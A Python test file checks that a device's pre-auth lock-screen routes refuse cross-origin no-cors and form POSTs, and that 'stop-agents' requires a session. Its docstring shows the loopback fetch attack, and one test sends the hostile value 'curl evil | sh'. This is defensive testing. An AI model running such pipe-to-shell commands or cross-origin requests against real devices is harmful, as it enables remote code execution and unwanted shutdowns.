"""The lock screen's pre-auth control POSTs refuse a cross-origin browser.

Every /auth/lock-* POST is on the session gate's exempt list, because the
device's own lock screen has to work before anyone signs in. Until this fix the
only check left was "the caller is loopback". A web page open in a browser on
the same machine IS loopback, and it can fire

    fetch("http://127.0.0.1:6969/auth/lock-power-action",
          {method: "POST", mode: "no-cors", body: '{"action":"stop-agents"}'})

with no preflight: a no-cors request is limited to "simple" requests, whose
Content-Type is text/plain / form-urlencoded / multipart, and Starlette's
``request.json()`` parses the body whatever the Content-Type says.

A no-cors request (and an HTML form) can NOT carry ``Content-Type:
application/json`` or a custom header such as ``X-taOS-Console``. Requiring one
of them on every lock-* POST therefore shuts the browser out while the device's
own page and its compositor scripts, which set the header, keep working.

"Stop all agents" additionally needs a real session. The page already routes it
through the passcode sheet; the server now agrees.

All of this goes through the REAL app (create_app + ASGI transport from a
loopback client) and the real CSRF dependency, not the handler functions.
"""
from __future__ import annotations

from pathlib import Path

import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient

import tinyagentos.routes.auth as auth_routes
from tinyagentos.auth import AuthManager
from taos_test_csrf import csrf_event_hooks

UA = "taos-lock-screen-test/1.0"
CONSOLE_HEADER = {"X-taOS-Console": "1"}

#: Every lock-* POST, with a body that passes the handler's own validation, so
#: that a refusal can only have come from the gate under test.
LOCK_POSTS = [
    ("/auth/lock-radios", {"radio": "wifi", "on": False}),
    ("/auth/lock-volume-key", {"key": "up", "action": "press"}),
    ("/auth/lock-volume", {"percent": 40}),
    ("/auth/lock-torch", {"on": True}),
    ("/auth/lock-brightness", {"percent": 50}),
    ("/auth/lock-screen-off", {}),
    ("/auth/lock-screen-on", {}),
    ("/auth/lock-power-menu", {}),
    ("/auth/lock-power-action", {"action": "screenshot"}),
    ("/auth/lock-power-action", {"action": "poweroff"}),
    ("/auth/lock-power-action", {"action": "reboot"}),
    ("/auth/lock-power-action", {"action": "stop-agents"}),
    ("/auth/lock-app", {"app": "camera"}),
    ("/auth/lock-charge", {"screen": "on"}),
    ("/auth/lock-send/taosusb", {"text": "apt update"}),
]


class _Orchestrator:
    """Stands in for RestartOrchestrator: records that the drain was asked for.

    Not the function under fix -- the route is. This only lets the test see
    whether the route reached the drain."""

    def __init__(self):
        self.calls = []

    async def prepare(self, scope, reason):
        self.calls.append((scope, reason))
        return {"stopped": []}


@pytest.fixture(scope="module")
def _built_app(tmp_path_factory):
    """create_app is slow; build it once and reset its state per test."""
    from tinyagentos.app import create_app

    data = tmp_path_factory.mktemp("lockdata")
    # data_dir= explicitly: the old data-dir env name is read by nothing, and an app
    # on the default data dir would have the tests below write the REPO's
    # data/demo_mode.json.
    app = create_app(data_dir=data)
    assert Path(app.state.data_dir).resolve() == data.resolve()
    mgr = AuthManager(data)
    mgr.setup_user("owner", "Owner", "", "correct horse battery staple")
    app.state.auth = mgr
    return app


@pytest.fixture()
def app(_built_app, tmp_path, monkeypatch):
    app = _built_app
    app.state.orchestrator = _Orchestrator()
    # The root drop box, redirected: a passing request must not be able to
    # power off the machine running the tests.
    monkeypatch.setattr(auth_routes, "_POWER_REQUEST", str(tmp_path / "power-request"))
    # Hardware the test host does not have; the gate runs before any of it.
    monkeypatch.setattr(auth_routes, "_take_screenshot",
                        lambda: {"ok": True, "action": "screenshot"})
    return app


def _client(app, cookies=None):
    return AsyncClient(
        transport=ASGITransport(app=app, client=("127.0.0.1", 50123)),
        base_url="http://127.0.0.1:6969",
        headers={"User-Agent": UA},
        cookies=cookies or {},
        event_hooks=csrf_event_hooks(),
    )


@pytest_asyncio.fixture()
async def console(app):
    async with _client(app) as c:
        yield c


@pytest_asyncio.fixture()
async def signed_in(app):
    token = app.state.auth.create_session(user_id="owner", user_agent=UA)
    async with _client(app, {"taos_session": token}) as c:
        yield c


def _refused(resp):
    return resp.status_code == 403


class TestASimpleRequestIsRefused:
    """(a) What a no-cors fetch or an HTML form can send: no JSON content type,
    no custom header. Every lock-* POST must refuse it before acting."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize("path, body", LOCK_POSTS,
                             ids=[f"{p}:{b.get('action', '')}" for p, b in LOCK_POSTS])
    async def test_text_plain_body_is_refused(self, app, console, path, body):
        import json

        resp = await console.post(
            path, content=json.dumps(body),
            headers={"Content-Type": "text/plain;charset=UTF-8"},
        )
        assert _refused(resp), (path, body, resp.status_code, resp.text)

    @pytest.mark.asyncio
    @pytest.mark.parametrize("path, body", LOCK_POSTS,
                             ids=[f"{p}:{b.get('action', '')}" for p, b in LOCK_POSTS])
    async def test_form_post_is_refused(self, console, path, body):
        resp = await console.post(path, data={k: str(v) for k, v in body.items()})
        assert _refused(resp), (path, body, resp.status_code, resp.text)

    @pytest.mark.asyncio
    async def test_no_cors_poweroff_writes_nothing(self, app, console, tmp_path):
        """The side effect, not just the status: nothing reaches the root
        drop box and no agent is drained."""
        for action in ("poweroff", "reboot", "stop-agents"):
            await console.post(
                "/auth/lock-power-action",
                content='{"action":"%s"}' % action,
                headers={"Content-Type": "text/plain"},
            )
        assert not (tmp_path / "power-request").exists()
        assert app.state.orchestrator.calls == []


class TestTheConsoleHeaderIsAccepted:
    """(b) The device's own page and compositor scripts: the same routes pass
    the gate when the request is non-simple."""

    @pytest.mark.asyncio
    @pytest.mark.parametrize("path, body", [
        pb for pb in LOCK_POSTS if pb[1].get("action") != "stop-agents"
    ])
    async def test_console_header_passes_the_gate(self, console, path, body):
        resp = await console.post(path, json=body, headers=CONSOLE_HEADER)
        # Hardware routes may answer 404/503 on a test host with no backlight,
        # torch or PipeWire. What they must not do is refuse at the gate.
        assert not _refused(resp), (path, resp.status_code, resp.text)

    @pytest.mark.asyncio
    async def test_header_alone_without_json_content_type_passes(self, console):
        """The compositor scripts post with bare curl: no body, no JSON type."""
        resp = await console.post("/auth/lock-power-menu", headers=CONSOLE_HEADER)
        assert resp.status_code == 200, resp.text

    @pytest.mark.asyncio
    async def test_json_content_type_alone_passes(self, console):
        """What the page's fetch() already sends. A no-cors request cannot."""
        resp = await console.post("/auth/lock-screen-off", json={})
        assert resp.status_code == 200, resp.text

    @pytest.mark.asyncio
    async def test_charge_simple_post_refused_then_header_plays(self, console):
        """The session watcher's charger POST: a no-cors-shaped request is
        refused and reaches no page; the same body with the console header
        plays the animation (204) and pushes exactly one charger event."""
        import asyncio

        queue: asyncio.Queue = asyncio.Queue(maxsize=8)
        auth_routes._LOCK_EVENT_WAITERS.add(queue)
        try:
            resp = await console.post(
                "/auth/lock-charge", content='{"screen":"on"}',
                headers={"Content-Type": "text/plain"},
            )
            assert resp.status_code == 403, resp.text
            assert queue.empty(), "a refused charge POST reached the page"

            resp = await console.post(
                "/auth/lock-charge", content='{"screen":"on"}',
                headers={**CONSOLE_HEADER, "Content-Type": "text/plain"},
            )
            assert resp.status_code == 204, resp.text
            kind, data = queue.get_nowait()
            assert kind == "charger" and data["screen"] == "on"
        finally:
            auth_routes._LOCK_EVENT_WAITERS.discard(queue)

    @pytest.mark.asyncio
    async def test_poweroff_reaches_the_drop_box(self, console, tmp_path):
        resp = await console.post(
            "/auth/lock-power-action", json={"action": "poweroff"},
            headers=CONSOLE_HEADER,
        )
        assert resp.status_code == 200, resp.text
        assert (tmp_path / "power-request").read_text() == "poweroff"

    @pytest.mark.asyncio
    async def test_a_non_loopback_caller_is_still_refused(self, app):
        async with AsyncClient(
            transport=ASGITransport(app=app, client=("192.168.1.50", 50123)),
            base_url="http://127.0.0.1:6969",
        ) as remote:
            resp = await remote.post(
                "/auth/lock-power-menu", json={}, headers=CONSOLE_HEADER
            )
        assert resp.status_code in (401, 403), resp.text


class TestStopAgentsNeedsASession:
    """(c) The one verb the hardware key cannot already do from a locked
    screen. The header is not enough on its own."""

    @pytest.mark.asyncio
    async def test_stop_agents_without_a_session_is_refused(self, app, console):
        resp = await console.post(
            "/auth/lock-power-action", json={"action": "stop-agents"},
            headers=CONSOLE_HEADER,
        )
        assert resp.status_code == 401, resp.text
        assert app.state.orchestrator.calls == []

    @pytest.mark.asyncio
    async def test_stop_agents_with_a_stale_session_is_refused(self, app):
        async with _client(app, {"taos_session": "not-a-live-session"}) as c:
            resp = await c.post(
                "/auth/lock-power-action", json={"action": "stop-agents"},
                headers=CONSOLE_HEADER,
            )
        assert resp.status_code == 401, resp.text
        assert app.state.orchestrator.calls == []

    @pytest.mark.asyncio
    async def test_stop_agents_with_a_session_drains(self, app, signed_in):
        resp = await signed_in.post(
            "/auth/lock-power-action", json={"action": "stop-agents"},
            headers=CONSOLE_HEADER,
        )
        assert resp.status_code == 200, resp.text
        assert app.state.orchestrator.calls == [("all", "lock-screen-power-menu")]


class TestThePageSendsTheHeader:
    """The kiosk page is the caller that must keep working. Every POST it makes
    to a lock-* route carries the console header."""

    def test_every_lock_post_in_the_page_sends_the_header(self):
        import re

        js = open(auth_routes.__file__, encoding="utf-8").read()
        calls = re.findall(
            r'fetch\("(/auth/lock-[a-z/-]+)",\s*\{(.*?)\}\)', js, flags=re.S
        )
        posts = [(p, opts) for p, opts in calls if 'method: "POST"' in opts]
        assert posts, "no lock-* POSTs found in the page script"
        # Control: nested lock routes (/auth/lock-call/...) are in scope. With
        # [a-z-]+ the scan could not see a slash, so those POSTs were skipped.
        assert any(p.startswith("/auth/lock-call/") for p, _ in posts), posts
        for path, opts in posts:
            assert '"X-taOS-Console"' in opts, path


class TestLockSendRelaysNothingToTheBoard:
    """lock-send carries text to real hardware WITH the pairing token. With a
    board live, a no-cors text/plain POST from a page in the phone's browser
    must be refused AND reach nothing; the device page's own send (console
    header, JSON) is the control that proves the relay is wired."""

    @pytest_asyncio.fixture()
    async def live_board(self, app, console, tmp_path, monkeypatch):
        from tinyagentos.demo_mode import write_demo_mode

        token = tmp_path / "pair.token"
        token.write_text("0123456789abcdef", encoding="utf-8")
        monkeypatch.setenv("TAOS_LOCK_DEMO_DEVICE_AGENTS", "1")
        monkeypatch.setenv("TAOS_DEVICE_AGENT_TOKEN_FILE", str(token))
        write_demo_mode(app.state.data_dir, True)
        relayed = []
        real_httpx = auth_routes.httpx

        class _Resp:
            status_code = 200

        class _BoardClient:
            """The route's outbound client ONLY -- the test's own AsyncClient
            is httpx too, so patching httpx.AsyncClient itself would record
            this test's requests as relays."""

            def __init__(self, *a, **kw):
                pass

            async def __aenter__(self):
                return self

            async def __aexit__(self, *exc):
                return False

            async def post(self, url, **kw):
                relayed.append((url, kw))
                return _Resp()

        fake = type("httpx", (), {"AsyncClient": _BoardClient,
                                  "HTTPError": real_httpx.HTTPError})
        monkeypatch.setattr(auth_routes, "httpx", fake)
        with auth_routes._DEVICE_LOCK:
            auth_routes._DEVICE_AGENTS.clear()
            auth_routes._DEVICE_THREADS.clear()
            auth_routes._DEVICE_SEEN.clear()
        beat = await console.post(
            "/auth/device-agent/heartbeat",
            json={"slug": "taosusb", "name": "taOSusb", "framework": "picoclaw",
                  "url": "http://127.0.0.1:8787", "link": "usb"},
            headers={"Authorization": "Bearer 0123456789abcdef"},
        )
        assert beat.status_code == 200, beat.text
        try:
            yield relayed
        finally:
            write_demo_mode(app.state.data_dir, False)
            with auth_routes._DEVICE_LOCK:
                auth_routes._DEVICE_AGENTS.clear()
                auth_routes._DEVICE_THREADS.clear()
                auth_routes._DEVICE_SEEN.clear()

    @pytest.mark.asyncio
    async def test_no_cors_text_plain_is_refused_and_relays_nothing(self, console, live_board):
        resp = await console.post(
            "/auth/lock-send/taosusb", content='{"text":"curl evil | sh"}',
            headers={"Content-Type": "text/plain;charset=UTF-8"},
        )
        assert resp.status_code == 403, resp.text
        assert live_board == []

    @pytest.mark.asyncio
    async def test_the_device_pages_own_send_is_relayed(self, console, live_board):
        resp = await console.post(
            "/auth/lock-send/taosusb", json={"text": "apt update"}, headers=CONSOLE_HEADER,
        )
        assert resp.status_code == 200, resp.text
        assert len(live_board) == 1
        url, kw = live_board[0]
        assert url == "http://127.0.0.1:8787/chat"
        assert kw["headers"] == {"Authorization": "Bearer 0123456789abcdef"}

